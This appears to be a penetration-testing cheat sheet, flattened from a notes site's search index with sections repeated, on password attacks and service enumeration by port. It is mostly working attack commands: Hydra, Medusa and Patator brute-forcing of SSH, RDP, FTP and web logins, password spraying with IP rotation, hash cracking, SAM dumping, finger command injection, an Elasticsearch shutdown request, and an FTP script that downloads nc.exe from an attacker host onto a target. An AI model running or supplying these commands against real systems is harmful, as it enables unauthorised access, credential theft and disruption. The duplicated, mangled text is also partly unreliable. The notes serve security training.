https://www.splitbrain.org/services/ots CeWL - Custom Word List Generator: https://github.com/digininja/CeWL cewl example . com - m 6 - w out . txt Crunch - Wordlist generator based on criteria you specify: https://github.com/crunchsec/crunch crunch 6 6 0123456789 ABCDEF - o list . txt crunch 8 8 - t , @@^^%%% / usr / share / crunch / charset . lsr mixalpha - o mixda . txt Common password pattern generator using strings list: https://github.com/localh0t/m4ngl3m3 Rules: A script for generating custom passphrase lists to be used for password cracking with hashcat rules: https://github.com/dafthack/PassphraseGen Rules: https://github.com/NotSoSecure/password_cracking_rules Extraction Firefox Decrypt - Tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles: https://github.com/unode/firefox_decrypt Responder - A LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication https://github.com/SpiderLabs/Responder Pwning with Responder \u2013 A Pentester\u2019s Guide: https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/ Windows Password Dumping pwdump fgdump windows credential editor (WCE) Password Spraying Spray: https://github.com/SpiderLabs/Spray SMB : spray . sh - smb 192 . 168 . 0 . 1 users . txt passwords . txt 1 35 SPIDERLABS OWA : spray . sh - owa 192 . 168 . 0 . 1 users . txt passwords . txt 1 35 post - request . txt Lync : spray . sh - lync https : // lyncdiscover . spiderlabs . com / users . txt passwords . txt 1 35 Note : For POST requests , replace username and password values with sprayuser and spraypassword . Password spraying using AWS Lambda for IP rotation: https://github.com/ustayready/CredKing Brute-forcing Patator https://github.com/lanjelot/patator FTP : patator ftp_login host = 10.10 . 0.1 user = someUser password = FILE0 0 = wordlist . txt SSH : patator ssh_login host = 10.10 . 0.1 user = someUser password = FILE0 0 = wordlist . txt * ftp_login : Brute - force FTP * ssh_login : Brute - force SSH * telnet_login : Brute - force Telnet * smtp_login : Brute - force SMTP * smtp_vrfy : Enumerate valid users using the SMTP VRFY command * smtp_rcpt : Enumerate valid users using the SMTP RCPT TO command * finger_lookup : Enumerate valid users using Finger * http_fuzz : Brute - force HTTP / HTTPS * rdp_gateway : Brute - force RDP Gateway * ajp_fuzz : Brute - force AJP * pop_login : Brute - force POP * pop_passd : Brute - force poppassd ( not POP3 ) * imap_login : Brute - force IMAP * ldap_login : Brute - force LDAP * smb_login : Brute - force SMB * smb_lookupsid : Brute - force SMB SID - lookup * rlogin_login : Brute - force rlogin * vmauthd_login : Brute - force VMware Authentication Daemon * mssql_login : Brute - force MSSQL * oracle_login : Brute - force Oracle * mysql_login : Brute - force MySQL * mysql_query : Brute - force MySQL queries * rdp_login : Brute - force RDP ( NLA ) * pgsql_login : Brute - force PostgreSQL * vnc_login : Brute - force VNC * dns_forward : Brute - force DNS * dns_reverse : Brute - force DNS ( reverse lookup subnets ) * ike_enum : Enumerate IKE transforms * snmp_login : Brute - force SNMPv1 / 2 and SNMPv3 * unzip_pass : Brute - force the password of encrypted ZIP files * keystore_pass : Brute - force the password of Java keystore files * sqlcipher_pass : Brute - force the password of SQLCipher - encrypted databases * umbraco_crack : Crack Umbraco HMAC - SHA1 password hashes patator http_fuzz url = http : // example . com / index . php method = POST body = \u200b name=zapper password=FILE0 autologin=1 enter=Sign+in 0 =/ usr / share / SecLists / Passwords / darkweb2017 - top1000 . txt accept_cookie = 1 follow = 1 - x ignore : fgrep = \u200b Login name or password is incorrect. Hydra - https://github.com/vanhauser-thc/thc-hydra SSH : hydra 10.10 . 10.1 - l testuser - P wordlist . txt - t 4 ssh RDP : hydra - V - l testuser - P wordlist . txt rdp :// 10.10 . 10.1 FTP : hydra 10.10 . 10.1 - V - l testuser - P wordlist . txt ftp SMB : hydra 10.10 . 10.1 - V - l testuser - P wordlist . txt smb POST form : hydra - l testuser - p wordlist . txt - e nsr 10.10 . 10.1 http - post - form http://10.10.10.1/login.php:username=^USER^ ssword=^PASS^ submit=Login: Error message - V Asterisk , AFP , Cisco AAA , Cisco auth , Cisco enable , CVS , Firebird , FTP , HTTP - FORM - GET , HTTP - FORM - POST , HTTP - GET , HTTP - HEAD , HTTP - POST , HTTP - PROXY , HTTPS - FORM - GET , HTTPS - FORM - POST , HTTPS - GET , HTTPS - HEAD , HTTPS - POST , HTTP - Proxy , ICQ , IMAP , IRC , LDAP , MEMCACHED , MONGODB , MS - SQL , MYSQL , NCP , NNTP , Oracle Listener , Oracle SID , Oracle , PC - Anywhere , PCNFS , POP3 , POSTGRES , RDP , Rexec , Rlogin , Rsh , RTSP , SAP / R3 , SIP , SMB , SMTP , SMTP Enum , SNMP v1 + v2 + v3 , SOCKS5 , SSH ( v1 and v2 ), SSHKEY , Subversion , Teamspeak ( TS2 ), Telnet , VMware - Auth , VNC and XMPP Medusa - https://github.com/jmk-foofus/medusa Medusa [ -h host|-H file ] [ -u username|-U file ] [ -p password|-P file ] [ -C file ] - M module [ OPT ] SSH : medusa - u testuser - P wordlist . txt - h host - M ssh FTP : ncrack - u testuser - P wordlist . txt - T 5 host - M ftp RDP ( pass - the - hash ) : medusa - M rdp - m PASS : HASH - h host - u someuser - p NTLM_hash AFP , CVS , FTP , HTTP , IMAP , MS - SQL , MySQL , NetWare NCP , NNTP , PcAnywhere , POP3 , PostgreSQL , REXEC , RDP , RLOGIN , RSH , SMBNT , SMTP - AUTH , SMTP - VRFY , SNMP , SSHv2 , Subversion ( SVN ), Telnet , VMware Authentication Daemon ( vmauthd ), VNC , Generic Wrapper , Web Form ncrack - https://github.com/nmap/ncrack SSH : ncrack - u testuser - P wordlist . txt host - p 22 RDP : ncrack - u testuser - P wordlist . txt host - p 3389 FTP : ncrack - u testuser - P wordlist . txt host - p 21 SSH , RDP , FTP , Telnet , HTTP ( S ), Wordpress , POP3 ( S ), IMAP , CVS , SMB , VNC , SIP , Redis , PostgreSQL , MySQL , MSSQL , MongoDB , Cassandra , WinRM , OWA , DICOM . [zip] fcrackzip - https://github.com/hyc/fcrackzip fcrackzip - D - p wordlist . txt - u test . zip 7 z2john . pl backup . 7 z 7 z2john . out Steghide https://github.com/Paradoxis/StegCracker https://github.com/Va5c0/Steghide-Brute-Force-Tool 7zip https://github.com/Seyptoo/7z-BruteForce OpenSSL keys https://github.com/cOb4l7/scriptCTFs/tree/master/De-ICE References New References LM, NTLM, Net-NTLMv2, oh my!: https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4","title":"Password attacks"},{"location":"password-attacks/#quick-reference","text":"Finding Passwords grep - rl hash grep - rl password Mutate wordlists / etc / john / john . conf $ [ 0 - 9 ] $ [ 0 - 9 ] john --wordlist=out.txt --rules --stdout mutated.txt Password Cracking john hashes . txt Htaccess medusa - h ip - u admin - P passwords . txt - M http - m DIR : / admin - T 20 FTP hydra - l admin - P pass . txt - v ip ftp HTTP Post hydra - l none - P rockyou . txt 10 . 10 . 10 . 43 http - post - form /department/login.php:username=admin password=^PASS^:Invalid Password - t 64 - V SSH hydra - L usernames . txt - P passwords . txt - s 2222 ssh : // 10 . 10 . 10 . 66 - v - t 4 Basic Auth cewl example . com - m 6 - w / root / mega - cewl . txt 2 / dev / null john --wordlist=mega-cewl.txt --rules --studout mega-cewl-mutated.txt medusa - h admin . example . com - u admin - P mega - cewl - mutated . txt - M http - n 81 - m DIR : / admin - T 30 Salted Hash Cracking oclHashcat - input file should be in format: passwordhash : salt oclHashcat - plus64 . bin - m 110 hashes . txt .. / big - wordlist --force RSA Private Key Password Recovery ssh2john id_rsa id_john john id_john --wordlist= PATH TO ROCKYOU.TXT KeePass Password Recovery keepass2john jeeves . kdbx jeeves . hash john jeeves . hash VNC reg query HKLM \\ SOFTWARE \\ RealVNC \\ vncserver Value : Password reg query HKCU \\ Software \\ TightVNC \\ Server Value : Password or PasswordViewOnly reg query HKLU \\ Software \\ TigerVNC \\ WinVNC4 reg query HKLM \\ Software \\ TigerVNC \\ WinVNC4 Value : Password C : \\ Program Files \\ UltraVNC \\ ultravnc . ini Value : passwd or passwd2 Linux Hash unshadow passwd . txt shadow . txt hashes . txt john \u2014 wordlist =/ usr / share / wordlists / rockyou . txt hashes . txt Cisco hashes python3 cisco_pwdecrypt . py - u \\$1\\$pdQG\\$o8nrSzsGXeaduXrjlvKc91 - d / usr / share / wordlists / rockyou . txt Decrypt gpg files: gpg \u2014 batch \u2014 passphrase whateverThePasswordIs - d theGPGfile WordPress: $ P$B9wJdX0NkO95U2L . kqAGXsFufwSp5N1 hashcat \u2014 force - m 400 hash . txt / usr / share / wordlists / rockyou . txt SSH key bruteforce - grep -lr against: https://github.com/g0tmi1k/debian-ssh/tree/master/common_keys Zip files fcrackzip - u - D - p / usr / share / wordlists / rockyou . txt file_name zip2john file . zip file . zip . hash john - w : / usr / share / wordlists / rockyou . txt file . zip . hash SSH2john / usr / share / john / ssh2john . py id_rsa ssh . hash john - w : / usr / share / wordlists / rockyou . txt ssh . hash Narrow down into a custom wordlist: grep - i hentai / usr / share / wordlists / rockyou . txt pass . lst grep - i pokemon / usr / share / wordlists / rockyou . txt pass . lst grep - i monkey / usr / share / wordlists / rockyou . txt pass . lst grep - i startrek / usr / share / wordlists / rockyou . txt pass . lst","title":"Quick Reference"},{"location":"password-attacks/#etcpasswd","text":"Understanding /etc/passwd File Format Linux Password Shadow File Formats Password Field Format: $ id$salt$hashed ( $ id$$hashed means no salt) * account cannot be used to log in !! user doesn't have a password user doesn't have a password x password is stored in the shadow file id $ 1 $ is MD5 $ 2 a$ is Blowfish $ 2 y$ is Blowfish $ 5 $ is SHA-256 $ 6 $ is SHA-512 Verify pwck -r /etc/passwd pwck -r /etc/shadow Edit vipw -p vipw -s vipw -g Manually create password openssl passwd -1 -salt xyz yourpass makepasswd --clearfrom = - --crypt-md5 YourPass mkpasswd -m sha-512 -s YourPass echo -e md5crypt\\npassword | grub | grep -o \\$1.* perl -e use Crypt::PasswdMD5; print unix_md5_crypt( Password , Salt ), \\n Update password echo username:password | chpasswd perl -e print crypt( YourPasswd , salt ), \\n echo username:encryptedPassWd | chpasswd -e OR useradd -p encryptedPassWd username","title":"/etc/passwd"},{"location":"password-attacks/#sam-files","text":"C : \\ windows \\ system32 \\ config \\ sam C : \\ windows \\ repair \\ sam Encrypted with 128bit rivest cipher - the key to syskey utility is called \"bootkey\" which is stored in system file which is in C : \\ windows \\ repair \\ system use samdump2 , etc. to both get the syskey from system file and use that to decrypt the hashes from uncle Sam samdump2 system_file sam_file john outputfile . txt","title":"SAM files"},{"location":"password-attacks/#tools","text":"Word-lists Wordhound - Wordlist generator that builds a list of password candidates for a specific target website: https://bitbucket.org/mattinfosec/wordhound/src/master/ Text sumarizer: https://www.splitbrain.org/services/ots CeWL - Custom Word List Generator: https://github.com/digininja/CeWL cewl example . com - m 6 - w out . txt Crunch - Wordlist generator based on criteria you specify: https://github.com/crunchsec/crunch crunch 6 6 0123456789 ABCDEF - o list . txt crunch 8 8 - t , @@^^%%% / usr / share / crunch / charset . lsr mixalpha - o mixda . txt Common password pattern generator using strings list: https://github.com/localh0t/m4ngl3m3 Rules: A script for generating custom passphrase lists to be used for password cracking with hashcat rules: https://github.com/dafthack/PassphraseGen Rules: https://github.com/NotSoSecure/password_cracking_rules Extraction Firefox Decrypt - Tool to extract passwords from Mozilla (Firefox/Thunderbird/Seabird) profiles: https://github.com/unode/firefox_decrypt Responder - A LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication https://github.com/SpiderLabs/Responder Pwning with Responder \u2013 A Pentester\u2019s Guide: https://www.notsosecure.com/pwning-with-responder-a-pentesters-guide/ Windows Password Dumping pwdump fgdump windows credential editor (WCE) Password Spraying Spray: https://github.com/SpiderLabs/Spray SMB : spray . sh - smb 192 . 168 . 0 . 1 users . txt passwords . txt 1 35 SPIDERLABS OWA : spray . sh - owa 192 . 168 . 0 . 1 users . txt passwords . txt 1 35 post - request . txt Lync : spray . sh - lync https : // lyncdiscover . spiderlabs . com / users . txt passwords . txt 1 35 Note : For POST requests , replace username and password values with sprayuser and spraypassword . Password spraying using AWS Lambda for IP rotation: https://github.com/ustayready/CredKing","title":"Tools"},{"location":"password-attacks/#brute-forcing","text":"Patator https://github.com/lanjelot/patator FTP : patator ftp_login host = 10.10 . 0.1 user = someUser password = FILE0 0 = wordlist . txt SSH : patator ssh_login host = 10.10 . 0.1 user = someUser password = FILE0 0 = wordlist . txt * ftp_login : Brute - force FTP * ssh_login : Brute - force SSH * telnet_login : Brute - force Telnet * smtp_login : Brute - force SMTP * smtp_vrfy : Enumerate valid users using the SMTP VRFY command * smtp_rcpt : Enumerate valid users using the SMTP RCPT TO command * finger_lookup : Enumerate valid users using Finger * http_fuzz : Brute - force HTTP / HTTPS * rdp_gateway : Brute - force RDP Gateway * ajp_fuzz : Brute - force AJP * pop_login : Brute - force POP * pop_passd : Brute - force poppassd ( not POP3 ) * imap_login : Brute - force IMAP * ldap_login : Brute - force LDAP * smb_login : Brute - force SMB * smb_lookupsid : Brute - force SMB SID - lookup * rlogin_login : Brute - force rlogin * vmauthd_login : Brute - force VMware Authentication Daemon * mssql_login : Brute - force MSSQL * oracle_login : Brute - force Oracle * mysql_login : Brute - force MySQL * mysql_query : Brute - force MySQL queries * rdp_login : Brute - force RDP ( NLA ) * pgsql_login : Brute - force PostgreSQL * vnc_login : Brute - force VNC * dns_forward : Brute - force DNS * dns_reverse : Brute - force DNS ( reverse lookup subnets ) * ike_enum : Enumerate IKE transforms * snmp_login : Brute - force SNMPv1 / 2 and SNMPv3 * unzip_pass : Brute - force the password of encrypted ZIP files * keystore_pass : Brute - force the password of Java keystore files * sqlcipher_pass : Brute - force the password of SQLCipher - encrypted databases * umbraco_crack : Crack Umbraco HMAC - SHA1 password hashes patator http_fuzz url = http : // example . com / index . php method = POST body = \u200b name=zapper password=FILE0 autologin=1 enter=Sign+in 0 =/ usr / share / SecLists / Passwords / darkweb2017 - top1000 . txt accept_cookie = 1 follow = 1 - x ignore : fgrep = \u200b Login name or password is incorrect. Hydra - https://github.com/vanhauser-thc/thc-hydra SSH : hydra 10.10 . 10.1 - l testuser - P wordlist . txt - t 4 ssh RDP : hydra - V - l testuser - P wordlist . txt rdp :// 10.10 . 10.1 FTP : hydra 10.10 . 10.1 - V - l testuser - P wordlist . txt ftp SMB : hydra 10.10 . 10.1 - V - l testuser - P wordlist . txt smb POST form : hydra - l testuser - p wordlist . txt - e nsr 10.10 . 10.1 http - post - form http://10.10.10.1/login.php:username=^USER^ ssword=^PASS^ submit=Login: Error message - V Asterisk , AFP , Cisco AAA , Cisco auth , Cisco enable , CVS , Firebird , FTP , HTTP - FORM - GET , HTTP - FORM - POST , HTTP - GET , HTTP - HEAD , HTTP - POST , HTTP - PROXY , HTTPS - FORM - GET , HTTPS - FORM - POST , HTTPS - GET , HTTPS - HEAD , HTTPS - POST , HTTP - Proxy , ICQ , IMAP , IRC , LDAP , MEMCACHED , MONGODB , MS - SQL , MYSQL , NCP , NNTP , Oracle Listener , Oracle SID , Oracle , PC - Anywhere , PCNFS , POP3 , POSTGRES , RDP , Rexec , Rlogin , Rsh , RTSP , SAP / R3 , SIP , SMB , SMTP , SMTP Enum , SNMP v1 + v2 + v3 , SOCKS5 , SSH ( v1 and v2 ), SSHKEY , Subversion , Teamspeak ( TS2 ), Telnet , VMware - Auth , VNC and XMPP Medusa - https://github.com/jmk-foofus/medusa Medusa [ -h host|-H file ] [ -u username|-U file ] [ -p password|-P file ] [ -C file ] - M module [ OPT ] SSH : medusa - u testuser - P wordlist . txt - h host - M ssh FTP : ncrack - u testuser - P wordlist . txt - T 5 host - M ftp RDP ( pass - the - hash ) : medusa - M rdp - m PASS : HASH - h host - u someuser - p NTLM_hash AFP , CVS , FTP , HTTP , IMAP , MS - SQL , MySQL , NetWare NCP , NNTP , PcAnywhere , POP3 , PostgreSQL , REXEC , RDP , RLOGIN , RSH , SMBNT , SMTP - AUTH , SMTP - VRFY , SNMP , SSHv2 , Subversion ( SVN ), Telnet , VMware Authentication Daemon ( vmauthd ), VNC , Generic Wrapper , Web Form ncrack - https://github.com/nmap/ncrack SSH : ncrack - u testuser - P wordlist . txt host - p 22 RDP : ncrack - u testuser - P wordlist . txt host - p 3389 FTP : ncrack - u testuser - P wordlist . txt host - p 21 SSH , RDP , FTP , Telnet , HTTP ( S ), Wordpress , POP3 ( S ), IMAP , CVS , SMB , VNC , SIP , Redis , PostgreSQL , MySQL , MSSQL , MongoDB , Cassandra , WinRM , OWA , DICOM . [zip] fcrackzip - https://github.com/hyc/fcrackzip fcrackzip - D - p wordlist . txt - u test . zip 7 z2john . pl backup . 7 z 7 z2john . out Steghide https://github.com/Paradoxis/StegCracker https://github.com/Va5c0/Steghide-Brute-Force-Tool 7zip https://github.com/Seyptoo/7z-BruteForce OpenSSL keys https://github.com/cOb4l7/scriptCTFs/tree/master/De-ICE","title":"Brute-forcing"},{"location":"password-attacks/#references","text":"","title":"References"},{"location":"password-attacks/#new-references","text":"LM, NTLM, Net-NTLMv2, oh my!: https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4","title":"New References"},{"location":"ports-and-protocols/","text":"Service Name and Transport Protocol Port Number Registry Template ## Name - port / tcp_or_udp ** Quick Reference ** ** Tools ** ** Hardening ** ** References ** Citrix - 1494/tcp Quick Reference Enumeration: ./citrix-pa-scan { IP_address/file | - | random } [ timeout ] citrix-pa-proxy.pl IP_to_proxy_to [ Local_IP ] DHCP Quick Reference Get new IP address from DHCP: Send DHCPDISCOVER Receive DHCPOFFER dhclient DNS - 53/tcp Quick Reference DNS on TCP Check for zone transfers Maybe DNS Sec enabled Configuration files host . conf resolv . conf named . conf Order of name resolution: / etc / nsswitch . conf DNS sever Information: / etc / resolv . conf Forward Lookup whois whois example.com whois 50 .7.67.186 ( reverse ) Reverse Lookup write the IP-address in reverse order (for e.g. 192.168.1.1 will be 1.1.168.192) append \u201c.in-addr.arpa.\u201d to it. dig 1 .1.168.192.in-addr.arpa. PTR for ip in $( seq 155 190 ) ; do host 50 .7.67. $ip ; done | grep -\u00ad\u2010v not found https://stackoverflow.com/questions/23981098/how-forward-and-reverse-dns-works Zone Transfers Copying of the zone file from a master DNS server to a slave server host -t axfr domain.name dns-server Root zone: dig axfr @dns - server Domain name: dig axfr @dns - server domain . name host - l example . com ns1 . example . com dnsrecon - d $ ip - t axfr nmap $ ip --script=dns-zone-transfer -p 53 Simple Zone Transfer Script: #/bin/bash # Simple Zone Transfer Bash Script # $1 is the first argument given after the bash script # Check if argument was given, if not, print usage if [ -\u00ad\u2010z $1 ] ; then echo [*] Simple Zone transfer script echo [*] Usage : $0 domain name exit 0 fi # if argument was given, identify the DNS servers for the domain for server in $( host -\u00ad\u2010t ns $1 | cut -\u00ad\u2010d -\u00ad\u2010f4 ) ; do # For each of these servers, attempt a zone transfer host -\u00adl $1 $server | grep has address done Bruteforcing fierce - dns site . com fierce - dns site . com - dnserver ns1 . site . com dnsenum site . com \u2013 dnsserver ns1 . site . com dnsenum site . com - f / root / hostlist . txt Subdomain bruteforcing for ip in $( cat list.txt ) ; do host $ip . $website ; done for domain in $( cat /usr/share/wordlists/dnscan/subdomains-100.txt ) ; do host $domain .mydomain.com ; sleep 2 ; done | grep has | sort -u Reverse dns lookup bruteforcing for ip in $( seq 155 190 ) ; do host 50 .7.67. $ip ; done | grep -v not found DNS Recon Workflow (WIP) 1) Get the host's addresse (A record). 2) Get the namservers (threaded). 3) Get the MX record (threaded). 4) Perform axfr queries on nameservers and get BIND VERSION (threaded). 5) Get extra names and subdomains via google scraping (google query = \"allinurl: -www site:domain\"). 6) Brute force subdomains from file 7) Calculate C class domain network ranges and perform whois queries on them (threaded). 8) Perform reverse lookups on netranges (C class or/and whois netranges) (threaded). 9) Write to domain_ips.txt file ip-blocks. Tools Dnsrecon dnsrecon -r 127 .0.0.0/24 -n 10 .10.10.29 dnsrecon -r 127 .0.1.0/24 -n 10 .10.10.29 dnsrecon -r 10 .10.10.0/24 -n 10 .10.10.29 dnsrecon -d thinc.local -n 10 .11.1.220 -t axfr -r 10 .11.1.0/24 dnsrecon -d site.com host host -t ns example.com host -t mx example.com host www.example.com - results in IP address host nonexistent.example.com - results in not found error host -l site.com ns2.site.com host -l friendzone.red 10 .10.10.123 | grep has address | awk {print $1} nslookup nslookup ip nslookup site.com nslookup -query = mx site.com nslookup -query = ns site.com nslookup -query = any site.com set type = a google.com server ns1.google.com google.com dig # Usage: dig [@global-server] [domain] [q-type] [q-class] {q-opt} # {global-d-opt} host [@local-server] {local-d-opt} # [ host [@local-server] {local-d-opt} [...]] dig google.com dig google.com mx dig @ns1.google.com google.com dig site.com dig site.com A dig +nocmd shite.com MX +noall +answer dig +nocmd site.com NS +noall +answer dig +nocmd site.com A +noall +answer dig site.com +nocmd AXFR +noall +answer @dns_server.com Zone Transfer fierce: https://github.com/davidpepper/fierce-domain-scanner scanner that helps locate non-contiguous IP space and hostnames against specified domains. pre-cursor to nmap, unicornscan, nessus, nikto, etc, since all of those require that you already know what IP space you are looking for General checks: fierce - dns example . com Wordlist attack: fierce - dns example . com - wordlist hosts . list recon-ng use recon / contacts / gather / http / api / whois_pocs set DOMAIN example . com run use recon / hosts / enum / http / web / xssed use recon / hosts / gather / http / web / google_site use recon / hosts / gather / http / web / ip_neighbor dnsenum dnsenum $ ip dnsrecon dnsrecon dnsrecon \u2010 d example . com \u2010 t axfr dnsenum dnsenum example . com subbrute Recursively crawls enumerated DNS records Uses open resolvers as a kind of proxy to circumvent DNS rate-limiting knock Wordlist based subdomain bruteforcing Virustotal search Sublist3r Subdomains with Google, Yahoo, Bing, Baidu, Ask, Netcraft, Virustotal, ThreatCrowd, DNSdumpster, and ReverseDNS Can do \"subbrute\" scans internally Can do port scans internally Online Services https://dnsdumpster.com/ Hardening References Payload Delivery Over DNS: https://github.com/no0be/DNSlivery DNS Rebind Toolkit https://github.com/Kinimiwar/dns-rebind-toolkit Global DNS Hijacking Campaign: DNS Record Manipulation at Scale: https://eforensicsmag.com/global-dns-hijacking-campaign-dns-record-manipulation-at-scale-by-muks-hirani-sarah-jones-ben-read/ ElasticSearch - 9200/tcp Quick Reference Interesting APIs Description URL Config information, OS, JVM version curl - XGET http : // ip : 9200 / _nodes ? pretty = true Shutdown curl - XPOST http : // ip : 9200 / _cluster / nodes / _master / _shutdown Dump data curl http:// ip :9200/_search?size=10000 pretty=true Snapshots _snapshot Hardening elasticsearch . yml - to prevent dynamic scripting: script . disable_dynamic : true https://medium.com/@bromiley/exploiting-elasticsearch-c83825708ce1 Finger - 79/tcp Quick Reference User enumeration finger @example.com finger a b c d e f g h @example.com finger 1 2 3 4 5 6 7 8 9 0 @target_host finger admin@example.com finger user@example.com finger 0 @example.com finger .@example.com finger **@example.com finger test@example.com http://pentestmonkey.net/tools/user-enumeration/finger-user-enum finger - user - enum . pl - U seclists / Usernames / Names / names . txt - t ip https://github.com/s0wr0b1ndef/OSCP-note/blob/master/ENUMERATION/FINGER/finger_enum_user.sh Finger Redirect finger @target_host1@target_host2 Command execution finger |/bin/id@example.com finger |/bin/ls -a /@example.com Finger Bounce - Hop from one finger deamon to another. Request will get logged as if it arrived from a relay. finger@host.com@victim.com References Giving the Finger to port 79 / Simple Finger Deamon Tutorial by Paris2K: http://cd.textfiles.com/hmatrix/Tutorials/hTut_0269.html http://0daysecurity.com/penetration-testing/enumeration.html FTP - 21/tcp Quick Reference Scan for anonymous FTP: nmap \u2010 v \u2010 p 21 - \u00ad\u2010 script = ftp \u2010 anon . nse 192 . 168 . 11 . 200 - 254 NSE: nmap --script=*ftp* --script-args=unsafe=1 -p 20,21 IP Anonymous login ftp ip_address Username : anonymous Password : any @ email . com ( if prompted ) Clone: wget - r --no-passive ftp://(USERNAME):(PASSWORD)@(TARGET IP ADDRESS) Config files ftpusers ftp . conf proftpd . conf MITM pasvagg.pl: https://packetstormsecurity.com/0007-exploits/pasvagg.pl Common FTP Commands GET .. / .. / .. / boot . ini GET .. / .. / .. / .. / .. / .. / boot . ini MGET .. / .. / .. / boot . ini MGET .. / .. / .. / .. / .. / .. / boot . ini Command Description ? Request help ascii Set the mode of file transfer to ASCII (default / transmits 7bits per character) binary Set the mode of file transfer to binary (transmits all 8bits per byte and thus provides less chance of a transmission error and must be used to transmit files other than ASCII files) bye Exit the FTP environment (same as quit) cd Change directory on the remote machine close Rerminate a connection with another computer close brubeck Closes the current FTP connection with brubeck, but still leaves you within the FTP environment. delete Delete a file in the current remote directory (same as rm in UNIX) get Copy one file from the remote machine to the local machine get ABC DEF Copies file ABC in the current remote directory to (or on top of) a file named DEF in your current local directory. get ABC Copies file ABC in the current remote directory to (or on top of) a file with the same name, ABC, in your current local directory. help Request a list of all available FTP command lcd Change directory on your local machine (same as UNIX cd) ls List the names of the files in the current remote directory mkdir Make a new directory within the current remote directory mget Copy multiple files from the remote machine to the local machine; you are prompted for a y/n answer before transferring each file mget * Copies all the files in the current remote directory to your current local directory, using the same filenames. Notice the use of the wild card character, *. mput Copy multiple files from the local machine to the remote machine; you are prompted for a y/n answer before transferring each file open Open a connection with another computer open brubeck Opens a new FTP connection with brubeck; you must enter a username and password for a brubeck account (unless it is to be an anonymous connection). put Copy one file from the local machine to the remote machine pwd Find out the pathname of the current directory on the remote machine quit Exit the FTP environment (same as bye) rmdir Remove a directory in the current remote directory Bruteforcing patator ftp_login host = 10 .11.1.220 port = 21 user = COMBO0 password = COMBO01 0 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u2019Login or password incorrect\u2019 patator ftp_login host = /root/oscp/lab-net2019/ftp-open.txt port = 21 user = COMBO0 password = COMBO01 0 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u2019Login or password incorrect\u2019 patator ftp_login host = FILE0 port = 21 user = COMBO0 password = COMBO1 0 = /root/oscp/lab-net2019/ftp-open.txt 1 = /root/oscp/lab-net2019/combo-creds.txt -x ignore:fgrep = \u2019Login or password incorrect\u2019 -x ignore:fgrep = \u2019cannot log in.\u2019 -x ignore:fgrep = \u2019Login incorrect\u2019 -l ftp_spray TCP FTP Bounce Scan: nmap \u2013 top - ports 1000 - vv - Pn - b anonymous : password @10.11.1.125 : 21 127.0.0.1 Script FTP echo open ( YOUR IP ) 21 C :\\ share \\ ftp . txt ( Writeable Directory on target ) echo USER pwnt C :\\ share \\ ftp . txt echo passwd C :\\ share \\ ftp . txt ( Password for your FTP Server ) echo bin C :\\ share \\ ftp . txt ( Sets transfer up for binary files / bytes ) echo GET nc . exe C :\\ share \\ nc . exe C :\\ share \\ ftp . txt echo bye C :\\ share \\ ftp . txt ftp - v - n - s : C : \\ share \\ ftp . txt Tools Hardening References IMAP - 134/tcp 993/tcp Quick Reference https://tools.ietf.org/html/rfc3501 Cheatsheet - https://busylog.net/telnet-imap-commands-note/ IMAP Capabilities Commands Extensions Connecting Port 143 (plain / no SSL) telnet IP 143 nc --crlf --verbose IP 143 Port 993 (SSL) openssl s_client - connect IP : 993 openssl s_client - connect IP : 993 - crlf - quiet Command Format Input: RandomStringID command Response: RandomStringID OK ANSWER DETAIL Login Login Method: A1 login someuser @example . com My_P @ssword1 When AUTH = PLAIN (SASL PLAIN Method) echo - en \\0someuser@example.com\\0My_P@ssword1 | openssl base64 a authenticate plain send null separated encoded username , password When AUTH = LOGIN (SASL AUTH LOGIN) echo - en someuser@example.com | openssl base64 echo - en My_P@ssword1 | base64 a AUTHENTICATE LOGIN send encoded username send encoded password SASL PLAIN as an Admin User (Masquerade another user) authcidNULauthzidNULpassword echo - en someuser@example.com\\0admin\\0admin1234 | openssl base64 a authenticate plain send encoded authcidNULauthzidNULpassword Capability: a capability Retrieving Emails and Modifying the Inbox Namespaces: n namespace Examine Inbox: ex1 EXAMINE INBOX List of folders L1 LIST * LIST mailbox path search argument L1 list INBOX/ * mailbox path if empty list shows all content from root search argument case-sensitive mailbox name with possible wildcards - is a wildcard, and matches zero or more characters at this position. % is similar to * but it does not match a hierarchy delimiter Status aa STATUS INBOX ( MESSAGES ) Fetch Messages aa SELECT INBOX f1 FETCH 1 BODY [] f2 fetch 2 RFC822 f3 fetch 1 : 4 ( BODY [ HEADER . FIELDS ( Subject )]) Unseen s search UNSEEN Delete d store 2 + FLAGS ( \\ Deleted ) e expunge Example Session 1 \\ . telnet brainfuck . htb 143 2 \\ . a1 LOGIN orestis kHGuERB29DNiNE 3 \\ . a2 LIST * 4 \\ . a3 EXAMINE INBOX 5 \\ . a4 FETCH 1 BODY [] 6 \\ . a5 FETCH 2 BODY [] Tools Hardening References IRC - 8067/tcp Quick Reference Version / Connect irssi -c 10 .10.10.117 --port 8067 LDAP - 389/tcp Quick Reference Configuration files containers . ldif ldap . cfg ldap . conf ldap . xml ldap - config . xml ldap - realm . xml slapd . conf Brute-forcing: nmap - p 389 --script ldap-brute --script-args ldap.base= cn=schema,dc=targetbox,dc=target (TARGET IP ADDRESS) -vv Dump: ldapdomaindump - u example \\ example 10 . 10 . 10 . 10 ldapsearch - LLL - x - H ldap : // domain - b - s base (objectclass=*) ldapsearch - LLL - x - H ldap : // domain - b - s base CN=example,DC=LOCAL ldapsearch - h EGOTISTICAL - BANK . LOCAL - p 389 - x - b DC=EGOTISTICAL-BANK,DC=LOCAL http://jrwren.wrenfam.com/blog/2006/11/17/querying-active-directory-with-unix-ldap-tools/index.html Tools Softerra LDAP Administrator Jxplorer active directory domain services management pack for system center LDAP Admin Tool LDAP Administrator tool Hardening References Memcache Quick Reference Connecting: telnet localhost 11211 Information gathering nmap - p 11211 --script memcached-info memcstat --servers=127.0.0.1 Read value memccat --servers = 192 